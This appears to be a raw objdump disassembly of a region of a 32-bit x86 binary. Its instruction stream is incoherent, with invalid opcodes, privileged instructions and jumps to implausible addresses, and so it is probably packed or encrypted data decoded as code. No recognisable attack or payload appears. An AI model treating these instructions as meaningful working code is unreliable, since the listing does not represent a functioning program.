  41746d:	sbb    BYTE PTR [ecx+ebp*4-0x5e],bl
  417471:	adc    esp,edx
  417473:	pop    edi
  417474:	out    0x1,eax
  417476:	sub    al,0x93
  417478:	fnstcw WORD PTR [ebx-0x5df1d738]
  41747e:	nop
  41747f:	nop
  417480:	adc    dl,ah
  417482:	lahf   
  417483:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417484:	nop
  417485:	ret    
  417486:	and    eax,0xc4ca30be
  41748b:	icebp  
  41748c:	lahf   
  41748d:	das    
  41748e:	shl    esp,0x9f
  417491:	icebp  
  417492:	es sub eax,0x1f4dc670
  417498:	push   0xffffffca
  41749a:	sar    DWORD PTR [ecx+0x1f],0x78
  41749e:	sbb    al,0x7c
  4174a0:	inc    ebx
  4174a1:	xchg   ah,dl
  4174a3:	dec    ecx
  4174a4:	xchg   edx,eax
  4174a5:	cmp    DWORD PTR [ebx+0x3],eax
  4174a8:	mov    bh,0x88
  4174aa:	into   
  4174ab:	inc    ebp
  4174ac:	gs jnp 0x4174c5
  4174af:	aad    0xa9
  4174b1:	adc    dl,ah
  4174b3:	fisttp DWORD PTR [ecx+0x17]
  4174b6:	pushf  
  4174b7:	adc    eax,0x2dca78d
  4174bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4174bd:	pop    ss
  4174be:	ror    BYTE PTR [edx+0x26],cl
  4174c1:	dec    esi
  4174c2:	cmp    ecx,DWORD PTR [esi]
  4174c4:	out    dx,al
  4174c5:	mov    eax,0x7a4bda6e
  4174ca:	je     0x41753c
  4174cc:	sub    DWORD PTR [edx],edx
  4174ce:	xlat   BYTE PTR ds:[ebx]
  4174cf:	sub    DWORD PTR [edi+esi*4+0x5c982e],edx
  4174d6:	std    
  4174d7:	arpl   bx,dx
  4174d9:	xor    esp,DWORD PTR [esi+0x67ffc5c8]
  4174df:	in     al,dx
  4174e0:	ret    0x648
  4174e3:	loope  0x4174cb
  4174e5:	lock outs dx,BYTE PTR es:[esi]
  4174e8:	call   0x8b860258
  4174ed:	push   edx
  4174ee:	inc    esi
  4174ef:	fldcw  WORD PTR [esi+0x73]
  4174f2:	in     al,dx
  4174f3:	clc    
  4174f4:	outs   dx,DWORD PTR ds:[esi]
  4174f5:	jnp    0x4174db
  4174f7:	jl     0x41755e
  4174f9:	rol    BYTE PTR [edx],cl
  4174fb:	clc    
  4174fc:	sbb    ebx,DWORD PTR [esi+0x74877747]
  417502:	sbb    BYTE PTR [ebx-0x66d119f9],bl
  417508:	push   0xa457173a
  41750d:	fucomi st,st(7)
  41750f:	mov    bl,0xbb
  417511:	loop   0x4174e6
  417513:	xor    eax,0x9b287a08
  417518:	xor    BYTE PTR [esi-0x55ee3e3b],0xbe
  41751f:	cwde   
  417520:	retf   
  417521:	jbe    0x4174d2
  417523:	xchg   bp,ax
  417525:	mov    cl,BYTE PTR [esi]
  417527:	in     al,0xcb
  417529:	stos   DWORD PTR es:[edi],eax
  41752a:	test   eax,0xb3096758
  41752f:	add    edx,ebx
  417531:	or     BYTE PTR [ecx-0x1c],0x4c
  417535:	inc    ebx
  417536:	cld    
  417537:	fsub   st,st(4)
  417539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41753a:	jns    0x417515
  41753c:	sbb    eax,0xe0bb50d1
  417541:	sub    al,0x6a
  417543:	fsub   st,st(0)
  417545:	stos   DWORD PTR es:[edi],eax
  417546:	call   0xbaca39b0
  41754b:	cmp    eax,0x427a87fc
  417550:	push   0xd95f8451
  417555:	cmc    
  417556:	aaa    
  417557:	out    dx,eax
  417558:	mov    ebp,0x1329d4c8
  41755d:	scas   al,BYTE PTR es:[edi]
  41755e:	out    dx,al
  41755f:	bound  ebp,QWORD PTR [eax-0x4b]
  417562:	mov    al,ds:0x67741470
  417567:	fistp  WORD PTR [ecx+0xd]
  41756a:	(bad)  
  41756b:	sub    BYTE PTR ds:0xd35c001c,cl
  417571:	xor    eax,0x22673526
  417576:	mov    BYTE PTR [esi-0x3e],bh
  417579:	xchg   esp,eax
  41757a:	push   edi
  41757b:	das    
  41757c:	cld    
  41757d:	outs   dx,DWORD PTR ds:[esi]
  41757e:	mov    dh,0xfb
  417580:	and    esi,DWORD PTR [ecx-0x55a39194]
  417586:	sbb    al,0x1d
  417588:	inc    ebp
  417589:	cld    
  41758a:	jno    0x417581
  41758c:	test   eax,0x74a8e695
  417591:	xor    al,0xc3
  417593:	push   ebp
  417594:	shl    BYTE PTR [eax+ecx*8-0x626523a],0xf0
  41759c:	cli    
  41759d:	sbb    DWORD PTR [edx+0x55],eax
  4175a0:	jp     0x4175dd
  4175a2:	popf   
  4175a3:	(bad)  
  4175a4:	int3   
  4175a5:	mov    bl,0x52
  4175a7:	stc    
  4175a8:	js     0x4175a1
  4175aa:	loop   0x417624
  4175ac:	adc    esp,DWORD PTR [ecx-0x53118b53]
  4175b2:	ja     0x417542
  4175b4:	cld    
  4175b5:	push   esp
  4175b6:	cwde   
  4175b7:	repnz das 
  4175b9:	aas    
  4175ba:	mov    ebx,0x6b113ea9
  4175bf:	adc    eax,0xc7b46072
  4175c4:	xlat   BYTE PTR ds:[ebx]
  4175c5:	push   edi
  4175c6:	pop    esi
  4175c7:	out    dx,eax
  4175c8:	xchg   esp,eax
  4175c9:	pushf  
  4175ca:	aaa    
  4175cb:	out    dx,eax
  4175cc:	loopne 0x417630
  4175ce:	jns    0x4175fd
  4175d0:	repnz push esi
  4175d2:	xchg   bh,dh
  4175d4:	cmc    
  4175d5:	lea    ebx,[edx]
  4175d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4175d8:	push   ds
  4175d9:	and    eax,0x94a14cba
  4175de:	pop    ebx
  4175df:	push   cs
  4175e0:	jmp    0xcaba:0x4e284063
  4175e7:	rol    DWORD PTR [ebp-0x3c8f63e8],cl
  4175ed:	stc    
  4175ee:	enter  0xd3e7,0x31
  4175f2:	adc    eax,0xf628f138
  4175f7:	pop    esp
  4175f8:	aas    
  4175f9:	push   esp
  4175fa:	mov    ah,0x73
  4175fc:	jbe    0x417664
  4175fe:	loopne 0x417630
  417600:	in     eax,dx
  417601:	ins    DWORD PTR es:[edi],dx
  417602:	cmp    DWORD PTR [esi+0x13b7041a],esp
  417608:	push   eax
  417609:	in     eax,0xe2
  41760b:	add    ah,al
  41760d:	fild   DWORD PTR [edi+0x11]
  417610:	jg     0x417605
  417612:	cmc    
  417613:	inc    ebx
  417614:	aaa    
  417615:	mov    ch,0x9d
  417617:	cmc    
  417618:	neg    BYTE PTR [ecx+0x40]
  41761b:	adc    cl,BYTE PTR [edx+edi*1+0x26]
  41761f:	pushf  
  417620:	inc    ecx
  417621:	dec    eax
  417622:	je     0x41760e
  417624:	rol    DWORD PTR [ebx],cl
  417626:	or     eax,0x3581d199
  41762b:	ins    DWORD PTR es:[edi],dx
  41762c:	ins    DWORD PTR es:[edi],dx
  41762d:	jne    0x417645
  41762f:	cmp    dh,ch
  417631:	jno    0x4176a0
  417633:	pusha  
  417634:	into   
  417635:	cli    
  417636:	and    al,0x56
  417638:	inc    esp
  417639:	aaa    
  41763a:	push   ss
  41763b:	arpl   WORD PTR [edi+0x56f0e716],cx
  417641:	int3   
  417642:	(bad)  es:[edi+0x71b508a1]
  417649:	pop    esi
  41764a:	sub    ecx,edx
  41764c:	aaa    
  41764d:	pop    edi
  41764e:	sbb    DWORD PTR [esi-0x3c],eax
  417651:	stc    
  417652:	imul   ebp,DWORD PTR [ebp-0x578bf7b8],0x31
  417659:	ror    BYTE PTR [ebp+0x57],cl
  41765c:	into   
  41765d:	imul   edx,DWORD PTR [ecx+ebp*2+0x706f6c4],0xc324f098
  417668:	jae    0x4176d3
  41766a:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  41766c:	adc    al,0x1c
  41766e:	sub    eax,0xafc7e8da
  417673:	out    0x1e,al
  417675:	scas   al,BYTE PTR es:[edi]
  417676:	popf   
  417677:	and    dl,BYTE PTR [ecx]
  417679:	adc    DWORD PTR [eax],ebp
  41767b:	jmp    0x8e2822af
  417680:	mov    esi,0xff255683
  417685:	jge    0x4176d7
  417687:	xor    eax,DWORD PTR [eax+0x15]
  41768a:	and    DWORD PTR [esi+eiz*1],edx
  41768d:	and    eax,0xb26e0031
  417692:	ret    0x3444
  417695:	add    dl,BYTE PTR [esi-0x1d]
  417698:	fistp  WORD PTR [ecx-0x6903b878]
  41769e:	or     DWORD PTR [edx+0x64],esi
  4176a1:	mov    dh,ah
  4176a3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4176a4:	js     0x417703
  4176a6:	out    dx,eax
  4176a7:	mov    eax,ds:0x36001507
  4176ac:	push   eax
  4176ad:	dec    eax
  4176ae:	and    al,0xc4
  4176b0:	push   0x1f
  4176b2:	mov    al,ds:0xd8534fa6
  4176b7:	daa    
  4176b8:	fstp   DWORD PTR [ecx-0x74]
  4176bb:	rcl    DWORD PTR [edx],cl
  4176bd:	dec    esi
  4176be:	adc    dl,BYTE PTR [edi-0x70]
  4176c1:	push   ecx
  4176c2:	xor    bh,BYTE PTR [edi+ecx*8+0x29]
  4176c6:	jns    0x4176bc
  4176c8:	add    bh,BYTE PTR [ebp+0x4d]
  4176cb:	jnp    0x417670
  4176cd:	cmp    eax,0x4da5773b
  4176d2:	fmul   st,st(1)
  4176d4:	sbb    ebp,edi
  4176d6:	dec    ebx
  4176d7:	inc    edi
  4176d8:	test   al,0xe9
  4176da:	cs xchg ecx,eax
  4176dc:	nop
  4176dd:	sbb    ecx,0xe19afa48
  4176e3:	xlat   BYTE PTR ds:[ebx]
  4176e4:	xchg   ecx,eax
  4176e5:	inc    ecx
  4176e6:	mov    eax,esi
  4176e8:	lods   ax,WORD PTR ds:[esi]
  4176ea:	mov    edi,DWORD PTR [esi+eiz*1]
  4176ed:	jg     0x417671
  4176ef:	or     al,0x27
  4176f1:	sub    eax,0x8464f6e0
  4176f6:	jne    0x41774f
  4176f8:	loope  0x4176dd
  4176fa:	repz pop ebp
  4176fc:	jge    0x4176f6
  4176fe:	mov    esp,0xe25d2dd0
  417703:	arpl   WORD PTR [ebx],dx
  417705:	loope  0x417707
  417707:	and    ebx,DWORD PTR [eax]
  417709:	(bad)  
  41770a:	pop    DWORD PTR [edi-0x47a0af58]
  417710:	retf   
  417711:	adc    ebx,DWORD PTR [ebx-0x7a29e394]
  417717:	mov    eax,ds:0xb7ad4313
  41771c:	sbb    DWORD PTR [eax-0x3db9bc6],edi
  417722:	mov    bl,0xf2
  417724:	and    BYTE PTR [ecx+0x77],al
  417727:	stos   DWORD PTR es:[edi],eax
  417728:	(bad)  
  417729:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41772a:	dec    esi
  41772b:	je     0x4177a6
  41772d:	jmp    ebp
  41772f:	sub    al,0xcf
  417731:	and    dl,BYTE PTR [ebx]
  417733:	mov    edi,0x9bc6abf7
  417738:	mov    eax,0xd577eb7e
  41773d:	push   es
  41773e:	xchg   ecx,eax
  41773f:	shl    DWORD PTR [ebx-0x46],cl
  417742:	inc    DWORD PTR [ebx]
  417744:	and    bl,BYTE PTR [ecx]
  417746:	xchg   esp,eax
  417747:	fdivr  QWORD PTR [eax-0x29]
  41774a:	aas    
  41774b:	in     eax,0xc9
  41774d:	xchg   DWORD PTR [ecx+edx*1],ecx
  417750:	data16 aas 
  417752:	push   edi
  417753:	sti    
  417754:	adc    cl,ch
  417756:	xlat   BYTE PTR ds:[ebx]
  417757:	mov    ah,0xde
  417759:	and    ecx,esp
  41775b:	enter  0xdba9,0xe5
  41775f:	hlt    
  417760:	cmp    ebp,DWORD PTR [edi+0x6f]
  417763:	ret    
  417764:	in     eax,dx
  417765:	(bad)  
  417766:	cwde   
  417767:	fs mov esi,0x6cfd8cf6
  41776d:	lods   al,BYTE PTR ds:[esi]
  41776e:	cwde   
  41776f:	div    cl
  417771:	lods   al,BYTE PTR ds:[esi]
  417772:	xor    BYTE PTR [ecx],bh
  417774:	aas    
  417775:	jae    0x41774b
  417777:	mov    bl,0xd2
  417779:	shl    BYTE PTR [ebp+0x7c],cl
  41777c:	jp     0x417780
  41777e:	shr    dl,1
  417780:	mov    esp,fs
  417782:	mov    DWORD PTR [eax-0x79d310ae],edx
  417788:	push   esi
  417789:	fs adc eax,0x1de5159b
  41778f:	out    dx,al
  417790:	xlat   BYTE PTR ds:[ebx]
  417791:	cmp    di,WORD PTR [eax+0xb]
  417795:	into   
  417796:	sar    DWORD PTR [edi],0x22
  417799:	not    DWORD PTR [ebp+ebx*8+0xa]
  41779d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41779e:	scas   al,BYTE PTR es:[edi]
  41779f:	mov    gs,WORD PTR [ebx]
  4177a1:	mov    esp,0x1f1b3b90
  4177a6:	dec    ebp
  4177a7:	pop    esp
  4177a8:	cmp    ecx,DWORD PTR [esi+eiz*8]
  4177ab:	fmulp  st(5),st
  4177ad:	push   esi
  4177ae:	scas   al,BYTE PTR es:[edi]
  4177af:	stos   DWORD PTR es:[edi],eax
  4177b0:	push   0xffffffad
  4177b2:	mov    al,0x81
  4177b4:	ins    BYTE PTR es:[edi],dx
  4177b5:	imul   ebp,DWORD PTR [eax],0xbe46ab21
  4177bb:	ror    DWORD PTR [esi+edi*2-0x21],0x2f
  4177c0:	dec    ecx
  4177c1:	(bad)  
  4177c2:	sar    bh,cl
  4177c4:	aas    
  4177c5:	cs xchg esp,eax
  4177c7:	sbb    DWORD PTR fs:[eax-0x77e715d1],esp
  4177ce:	adc    al,0xa6
  4177d0:	or     cl,0xa3
  4177d3:	iret   
  4177d4:	sbb    eax,ecx
  4177d6:	xchg   esi,eax
  4177d7:	sbb    eax,DWORD PTR [eax]
  4177d9:	leave  
  4177da:	jns    0x4177a4
  4177dc:	xchg   edx,eax
  4177dd:	loop   0x41778d
  4177df:	mov    edi,0x24a1518
  4177e4:	mov    ch,0x1d
  4177e6:	out    dx,al
  4177e7:	pop    ecx
  4177e8:	out    0xd3,al
  4177ea:	fmul   QWORD PTR [esi+0x33]
  4177ed:	rcr    DWORD PTR [eax+0x31],cl
  4177f0:	int    0xaf
  4177f2:	and    edi,DWORD PTR [ecx+0xb1e0a53]
  4177f8:	fdivrp st(4),st
  4177fa:	adc    dh,ch
  4177fc:	and    ebp,esp
  4177fe:	retf   
  4177ff:	repz or BYTE PTR [esi],dh
  417802:	add    al,0xc4
  417804:	jge    0x93e9da9a
  41780a:	or     BYTE PTR [esi],dh
  41780c:	cwde   
  41780d:	outs   dx,DWORD PTR ds:[esi]
  41780e:	mov    BYTE PTR [ebx],bl
  417810:	iret   
  417811:	push   esi
  417812:	xchg   esi,eax
  417813:	jnp    0x41786c
  417815:	jbe    0x41788d
  417817:	pop    edx
  417818:	ja     0x417888
  41781a:	sub    edi,DWORD PTR [ebp+0x2c53c6e4]
  417820:	nop
  417821:	inc    esi
  417822:	xchg   esp,eax
  417823:	fnstenv [esi]
  417825:	adc    edx,DWORD PTR [ecx]
  417827:	push   ebx
  417828:	mov    WORD PTR [esi-0x10],fs
  41782b:	ret    
  41782c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41782d:	pop    edx
  41782e:	inc    eax
  41782f:	jecxz  0x4177fb
  417831:	inc    ecx
  417832:	adc    dl,BYTE PTR [esi+esi*8-0x1b]
  417836:	ret    0x3f91
  417839:	test   eax,0x967556d8
  41783e:	cmp    BYTE PTR [ebx-0x1568f1b2],cl
  417844:	push   0xfffffff0
  417846:	dec    eax
  417847:	fcmovne st,st(3)
  417849:	mov    eax,0x6a8e9bb9
  41784e:	adc    eax,DWORD PTR [esi]
  417850:	shl    BYTE PTR [ebx],0xf7
  417853:	aad    0x38
  417855:	inc    edi
  417856:	mov    ds:0xc50f15dc,al
  41785b:	lock mov BYTE PTR [edi+0x48c5f051],dl
  417862:	addr16 (bad) 
  417864:	adc    eax,0x5ec0a2f3
  417869:	je     0x417833
  41786b:	xor    BYTE PTR [ebx-0x59],bl
  41786e:	or     ch,BYTE PTR [edi-0x5d]
  417871:	push   eax
  417872:	jmp    0x4beabc1c
  417877:	inc    ebp
  417878:	clc    
  417879:	mov    dh,0xa0
  41787b:	xchg   DWORD PTR ds:0xf6059fda,ecx
  417881:	push   ss
  417882:	mov    edx,0x16f3f53d
  417887:	xchg   esp,eax
  417888:	xchg   al,dl
  41788a:	sub    esp,DWORD PTR [edi+eiz*8]
  41788d:	mov    dl,BYTE PTR [eax+0x15c07b41]
  417893:	xor    ecx,DWORD PTR [ecx]
  417895:	inc    ecx
  417896:	sub    DWORD PTR [ebx+eiz*2],esi
  417899:	xor    bl,al
  41789b:	loope  0x417912
  41789d:	retf   
  41789e:	add    DWORD PTR [esi],0xfffffff0
  4178a1:	cmp    al,0xe4
  4178a3:	mov    ebx,DWORD PTR [ecx]
  4178a5:	arpl   WORD PTR [ecx+ebx*2-0x38d71dfc],dx
  4178ac:	and    DWORD PTR [ebx],ecx
  4178ae:	jb     0x417912
  4178b0:	imul   edx,DWORD PTR [ecx],0x31644d08
  4178b6:	fcomi  st,st(4)
  4178b8:	pop    esp
  4178b9:	enter  0x3336,0xa7
  4178bd:	jp     0x4178c6
  4178bf:	xor    BYTE PTR [ebp-0x41],dl
  4178c2:	mov    ch,0x59
  4178c4:	(bad)  
  4178c5:	jo     0x417883
  4178c7:	lahf   
  4178c8:	in     eax,dx
  4178c9:	and    BYTE PTR [ebx+edx*1-0x523500a2],cl
  4178d0:	fs mov bh,0xed
  4178d3:	adc    BYTE PTR [esi-0x1ff075ca],0x1e
  4178da:	nop
  4178db:	fcomp  DWORD PTR [ebp-0x1]
  4178de:	mov    ch,0x2a
  4178e0:	js     0x417880
  4178e2:	and    eax,0x5d094d2a
  4178e7:	cmp    al,0xc3
  4178e9:	sti    
  4178ea:	pop    ecx
  4178eb:	cmp    bh,bh
  4178ed:	jno    0x417953
  4178ef:	push   0xffffffa7
  4178f1:	adc    eax,ebx
  4178f3:	xchg   esi,eax
  4178f4:	call   0x2aa7c0e3
  4178f9:	popa   
  4178fa:	push   eax
  4178fb:	xchg   edx,eax
  4178fc:	sbb    BYTE PTR [ecx-0x1d0949cf],bh
  417902:	mov    dl,0x52
  417904:	sti    
  417905:	aas    
  417906:	xchg   edi,eax
  417907:	out    dx,eax
  417908:	out    dx,al
  417909:	mov    bh,0x54
  41790b:	jecxz  0x417913
  41790d:	test   al,0x3e
  41790f:	ret    0x738d
  417912:	ret    
  417913:	in     eax,dx
  417914:	sar    BYTE PTR [ebx+0xc8b2431],1
  41791a:	mov    ecx,0xd0a2b677
  41791f:	inc    edx
  417920:	(bad)  
  417921:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417922:	loop   0x4178bf
  417924:	sub    DWORD PTR [ebx-0x248bc80d],edx
  41792a:	push   ecx
  41792b:	push   ebx
  41792c:	outs   dx,BYTE PTR ds:[esi]
  41792d:	ins    DWORD PTR es:[edi],dx
  41792e:	xchg   esi,eax
  41792f:	inc    edx
  417930:	adc    dh,ah
  417932:	test   BYTE PTR ds:0x678c726f,0x47
  417939:	dec    edi
  41793a:	in     al,0x48
  41793c:	lods   al,BYTE PTR ds:[esi]
  41793d:	out    dx,al
  41793e:	xchg   esi,eax
  41793f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417940:	inc    ebx
  417941:	mov    ecx,0xe727cae8
  417946:	int    0x74
  417948:	jmpw   0xa13b
  41794c:	les    ebx,FWORD PTR [ebp-0x37]
  41794f:	push   esi
  417950:	fcmovnb st,st(7)
  417952:	(bad)  
  417953:	leave  
  417954:	push   di
  417956:	int    0xc8
  417958:	mov    gs,esi
  41795a:	int    0xfc
  41795c:	add    edx,edx
  41795e:	retf   0x2cd9
  417961:	icebp  
  417962:	int3   
  417963:	das    
  417964:	fsub   DWORD PTR [ecx+0x7]
  417967:	or     eax,0x12aeb32b
  41796c:	push   ss
  41796d:	cmp    al,0x4f
  41796f:	and    ah,BYTE PTR [ebp+eax*8-0x17]
  417973:	xor    al,BYTE PTR [ebp+0x3b]
  417976:	push   ebp
  417977:	(bad)  
  417978:	ins    BYTE PTR es:[edi],dx
  417979:	mov    ds:0xd304a624,al
  41797e:	mov    BYTE PTR [esi*2+0x285e0039],cl
  417985:	adc    eax,0x48eb9189
  41798a:	mov    esp,ecx
  41798c:	pushf  
  41798d:	and    al,0xa6
  41798f:	fsub   DWORD PTR [bp+di+0x2f31]
  417994:	sbb    al,0x27
  417996:	out    dx,eax
  417997:	or     ecx,DWORD PTR [ecx+0x53]
  41799a:	sub    bl,BYTE PTR [edx]
  41799c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41799d:	inc    edx
  41799e:	jge    0x4179cd
  4179a0:	call   0x6e82:0x75c68927
  4179a7:	mov    cl,cl
  4179a9:	mov    ds:0xc4274f81,al
  4179ae:	mov    eax,ds:0xff19c155
  4179b3:	add    eax,0x10a377b5
  4179b8:	in     eax,0x64
  4179ba:	mov    esi,0x2d411c1e
  4179bf:	sbb    BYTE PTR [ebx],dl
  4179c1:	in     eax,dx
  4179c2:	xor    al,0x11
  4179c4:	or     al,0x31
  4179c6:	out    0x49,al
  4179c8:	push   cs
  4179c9:	and    edi,edx
  4179cb:	repz bound edx,QWORD PTR [esi-0x9]
  4179cf:	sbb    eax,0x2fe5be4b
  4179d4:	add    al,0x79
  4179d6:	sub    DWORD PTR [edx-0x25],eax
  4179d9:	jmp    0x4179ce
  4179db:	les    eax,FWORD PTR [eax+ebp*4-0x4768dbe8]
  4179e2:	ror    BYTE PTR [ebx+0x4b3f58f1],1
  4179e8:	push   ecx
  4179e9:	mov    edi,0xfa24d302
  4179ee:	shl    ebp,0x9e
  4179f1:	mov    ecx,0x1f7b7236
  4179f6:	imul   eax,DWORD PTR [ebx],0x53
  4179f9:	push   esi
  4179fa:	retf   0x9312
  4179fd:	and    ch,BYTE PTR [esi-0x47]
  417a00:	add    BYTE PTR [edi],dl
  417a02:	or     ebx,DWORD PTR [esi+0x7c]
  417a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417a06:	adc    BYTE PTR [edx],bh
  417a08:	sbb    bh,ch
  417a0a:	mov    esp,0x40346772
  417a0f:	push   esp
  417a10:	clc    
  417a11:	fs out 0x39,eax
  417a14:	loop   0x417a95
  417a16:	frstor [edx+0x43aeebec]
  417a1c:	es inc edi
  417a1e:	lods   eax,DWORD PTR ds:[esi]
  417a1f:	add    cl,BYTE PTR [esp+edi*1-0x5f5033aa]
  417a26:	adc    ebx,ebx
  417a28:	xchg   esi,eax
  417a29:	iret   
  417a2a:	lods   eax,DWORD PTR ds:[esi]
  417a2b:	sub    DWORD PTR [eax-0x7ebad994],esp
  417a31:	mov    WORD PTR fs:[ebx-0x37],es
  417a35:	sti    
  417a36:	imul   esp,DWORD PTR [edi-0x74],0xbd31bcc8
  417a3d:	inc    esp
  417a3e:	sub    al,0x8f
  417a40:	jae    0x4179c7
  417a42:	mov    dh,0xf2
  417a44:	push   ebp
  417a45:	cmp    ebp,esp
  417a47:	jno    0x417abc
  417a49:	cmp    ebx,DWORD PTR [edi]
  417a4b:	stos   BYTE PTR es:[edi],al
  417a4c:	jne    0x417a28
  417a4e:	xchg   ecx,eax
  417a4f:	in     al,dx
  417a50:	imul   esi,DWORD PTR [esi-0x26f56d01],0xffffff93
  417a57:	cwde   
  417a58:	ins    DWORD PTR es:[edi],dx
  417a59:	jne    0x4179f8
  417a5b:	shl    DWORD PTR ds:0x46713f5c,0x64
  417a62:	push   ss
  417a63:	out    dx,eax
  417a64:	mov    bl,0xa1
  417a66:	das    
  417a67:	shl    DWORD PTR [eax-0x5ba0047c],0xca
  417a6e:	ret    0x9035
  417a71:	shl    DWORD PTR [edx+0x6b0cb262],cl
  417a77:	sahf   
  417a78:	inc    edx
  417a79:	dec    ecx
  417a7a:	enter  0xd0b9,0x4b
  417a7e:	push   esp
  417a7f:	sbb    ecx,DWORD PTR [esi+0x37]
  417a82:	scas   al,BYTE PTR es:[edi]
  417a83:	xor    BYTE PTR [ebp+0x47deaffb],0x0
  417a8a:	shr    DWORD PTR [eax-0x3a323732],0xcd
  417a91:	mov    bl,0xb7
  417a93:	mov    bl,0xe
  417a95:	dec    ebp
  417a96:	mov    ds:0x424291a8,eax
  417a9b:	jbe    0x417a27
  417a9d:	xor    BYTE PTR [ebp+eiz*2+0x756a5e38],ah
  417aa4:	out    0xb1,al
  417aa6:	inc    ebp
  417aa7:	out    dx,al
  417aa8:	scas   eax,DWORD PTR es:[edi]
  417aa9:	loope  0x417a9b
  417aab:	test   DWORD PTR [esi+0x6e87a618],ebp
  417ab1:	mov    cl,0xb3
  417ab3:	and    DWORD PTR [edx],esp
  417ab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ab6:	sub    al,0x3e
  417ab8:	lahf   
  417ab9:	hlt    
  417aba:	test   eax,0x1b8cb1a1
  417abf:	pop    es
  417ac0:	xor    eax,DWORD PTR [esi+0x2a]
  417ac3:	xor    ebp,DWORD PTR [ebx-0x5aa7bb27]
  417ac9:	cli    
  417aca:	mov    ds:0x8d8d4843,al
  417acf:	or     eax,0x53869827
  417ad4:	sub    al,cl
  417ad6:	fs push es
  417ad8:	jbe    0x417af9
  417ada:	leave  
  417adb:	jns    0x417b15
  417add:	and    al,0x6
  417adf:	das    
  417ae0:	sbb    BYTE PTR ss:[ebx],0xf6
  417ae4:	fisub  WORD PTR [esi]
  417ae6:	inc    esi
  417ae7:	adc    al,0x20
  417ae9:	not    BYTE PTR [ebx]
  417aeb:	js     0x417a84
  417aed:	jmp    0x1626:0xef16a1a5
  417af4:	add    esp,DWORD PTR [ecx+edi*8+0x16c1d356]
  417afb:	jnp    0x417b39
  417afd:	std    
  417afe:	stos   BYTE PTR es:[edi],al
  417aff:	pop    ss
  417b00:	lods   al,BYTE PTR ds:[esi]
  417b01:	es fs cmp eax,0xd0e88aa1
  417b08:	sub    bl,0xe0
  417b0b:	cmp    eax,0x21d8f978
  417b10:	pop    edx
  417b11:	sbb    DWORD PTR [ebp+0x6a],esi
  417b14:	mov    edx,esi
  417b16:	cmp    eax,0x7688f180
  417b1b:	bound  esp,QWORD PTR [edx+0x2d]
  417b1e:	jle    0x417aa3
  417b20:	or     al,0xe9
  417b22:	gs cmc 
  417b24:	icebp  
  417b25:	inc    ecx
  417b26:	lock mov esp,0x813394c3
  417b2c:	loopne 0x417b00
  417b2e:	xchg   edx,eax
  417b2f:	sub    edx,DWORD PTR [esi-0x110079a1]
  417b35:	xchg   edx,eax
  417b36:	aam    0xc3
  417b38:	jae    0x417b74
  417b3a:	sbb    dl,dl
  417b3c:	repz push es
  417b3e:	mov    eax,0x3c3731dd
  417b43:	push   ss
  417b44:	es sbb eax,0xb54c0372
  417b4a:	in     al,0x2
  417b4c:	mov    esp,0x89236ea0
  417b51:	pop    esp
  417b52:	cmp    BYTE PTR ds:0xe6d81ddf,ah
  417b58:	sbb    BYTE PTR [edx+0x28],ah
  417b5b:	mov    ch,0xd
  417b5d:	mov    ds:0x8f3a6346,eax
  417b62:	loop   0x417bc8
  417b64:	lods   al,BYTE PTR ds:[esi]
  417b65:	xor    eax,0x8ad6f19a
  417b6a:	jmp    0xbd80:0xefa19234
  417b71:	add    DWORD PTR [esi],esi
  417b73:	lods   al,BYTE PTR ds:[esi]
  417b74:	xchg   ecx,eax
  417b75:	retf   
  417b76:	jmp    0x417b66
  417b78:	mov    bl,0xf2
  417b7a:	mov    WORD PTR [edi-0x4a],fs
  417b7d:	(bad)  
  417b7f:	cmp    eax,0x65b20a77
  417b84:	mov    eax,ds:0xcb18b4ad
  417b89:	pusha  
  417b8a:	in     eax,0xde
  417b8c:	mov    al,0xaf
  417b8e:	hlt    
  417b8f:	int3   
  417b90:	jge    0x417be2
  417b92:	jle    0x417be9
  417b94:	in     al,dx
  417b95:	xlat   BYTE PTR ds:[ebx]
  417b96:	cld    
  417b97:	retf   
  417b98:	adc    al,0x66
  417b9a:	jne    0x417bb1
  417b9c:	ror    DWORD PTR [edx-0x31ff08d4],1
  417ba2:	mov    BYTE PTR [ebp-0x7843b24a],al
  417ba8:	loope  0x417b67
  417baa:	mov    bh,BYTE PTR [esp+ecx*8+0x7ae93d11]
  417bb1:	sub    dl,BYTE PTR [esi]
  417bb3:	sub    BYTE PTR [edx+0x40],ah
  417bb6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417bb7:	fcmovb st,st(5)
  417bb9:	sub    BYTE PTR [ebp-0x59491534],0x3f
  417bc0:	jle    0x417b6b
  417bc2:	pop    ebp
  417bc3:	adc    dh,BYTE PTR [edi]
  417bc5:	fmul   st,st(1)
  417bc7:	and    dh,BYTE PTR [edx+ecx*2+0x31]
  417bcb:	or     BYTE PTR [ebx-0x5542f4cc],bl
  417bd1:	cmp    BYTE PTR [eax],bl
  417bd3:	fwait
  417bd4:	cdq    
  417bd5:	or     edi,DWORD PTR [edx]
  417bd7:	xor    ebp,DWORD PTR [esi+0x7e3dc77a]
  417bdd:	sub    edx,DWORD PTR [esi+0x4ece0aed]
  417be3:	mov    al,ds:0x4f36cdb
  417be8:	cwde   
  417be9:	lock or DWORD PTR [ebx],edi
  417bec:	xor    edx,edi
  417bee:	inc    eax
  417bef:	mul    cl
  417bf1:	popa   
  417bf2:	addr16 dec ebp
  417bf4:	push   ebx
  417bf5:	fld    TBYTE PTR [ebx+0x2f]
  417bf8:	mov    ds:0xe1ae87ff,eax
  417bfd:	repnz xor DWORD PTR fs:[ebx],edi
  417c01:	jmp    0x417bf3
  417c03:	pop    ebx
  417c04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
